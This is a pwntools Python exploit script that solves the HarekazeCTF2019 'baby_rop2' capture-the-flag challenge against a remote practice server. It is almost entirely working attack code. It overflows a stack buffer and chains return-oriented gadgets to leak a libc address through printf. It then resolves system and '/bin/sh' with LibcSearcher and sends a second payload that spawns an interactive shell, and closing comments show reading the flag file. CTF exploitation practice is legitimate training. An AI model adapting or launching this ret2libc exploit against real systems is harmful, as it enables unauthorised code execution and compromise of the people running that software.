#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher


filename = './HarekazeCTF2019_baby_rop2'
e = ELF(filename)
# p = process(filename)
p = remote("node3.buuoj.cn", 29984)

#    0x0000000000400689 <+83>:    lea    -0x20(%rbp),%rax
#    0x000000000040068d <+87>:    mov    $0x100,%edx
#    0x0000000000400692 <+92>:    mov    %rax,%rsi
#    0x0000000000400695 <+95>:    mov    $0x0,%edi
#    0x000000000040069a <+100>:   callq  0x400500 <read@plt>
# buffer size=0x20, max length of input=0x100
ra_offset = 0x20 + 0x8

# ROPgadget --binary HarekazeCTF2019_baby_rop2 --only 'pop|ret'
pop_rdi_ret = 0x0000000000400733
main = e.sym['main']
# TODO HINT 1:
# https://h-noson.hatenablog.jp/entry/2019/05/19/232401#Baby-ROP-2-200-pts-81-solves
# Leaked address of "printf" ends with '\x00' and process outputs NOTHING
printf_plt, read_got = e.plt['printf'], e.got['read']
# log.level = 'DEBUG'
log.debug(f'read:got={hex(read_got)}, printf:plt={hex(printf_plt)}; main={hex(main)}')
p.recvuntil(b'What')
payload_leak = b'1' * ra_offset + p64(pop_rdi_ret) + p64(read_got) + p64(printf_plt) + p64(main)

p.sendline(payload_leak)
log.level = 'DEBUG'
misc = p.recvuntil(b'\n')
log.debug(f'misc={misc}, len={len(misc)}')

# Outputs contain the string from next run
read_addr = u64(p.recvuntil(b'What')[:-len(b'What')].ljust(8, b'\x00'))
assert read_addr
log.success(f'address of "read()": {hex(read_addr)}')

searcher = LibcSearcher()
searcher.add_condition('read', read_addr)
base_addr = read_addr - searcher.dump('read')
system_addr = searcher.dump('system') + base_addr
bin_sh_addr = searcher.dump('str_bin_sh') + base_addr
log.success(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')

payload = b'2' * ra_offset + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)

p.sendline(payload)
p.interactive()

# find . -name '*flag*'
# cat ./home/babyrop2/flag